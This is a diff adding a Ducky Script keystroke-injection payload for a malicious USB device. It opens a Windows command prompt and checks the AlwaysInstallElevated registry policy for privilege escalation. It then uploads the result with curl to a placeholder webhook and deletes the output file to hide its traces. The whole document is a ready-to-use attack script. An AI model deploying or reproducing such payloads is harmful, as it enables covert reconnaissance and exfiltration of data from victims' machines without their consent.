@@ -1,0 +1,14 @@
+REM Author: sysgerm @ CosmodiumCS
+GUI r
+DELAY 500
+STRING cmd.exe
+ENTER
+DELAY 500
+STRING reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated > privesc.txt
+ENTER
+STRING curl.exe -F "payload_json={\"username\": \"Is he Always Elevated\", \"content\": \"**Do we got da privesc?** (If empty, privesc is false)\"}" -F "file=@privesc.txt" YOUR WEBHOOK
+ENTER
+STRING del privesc.txt
+ENTER
+STRING exit
+ENTER
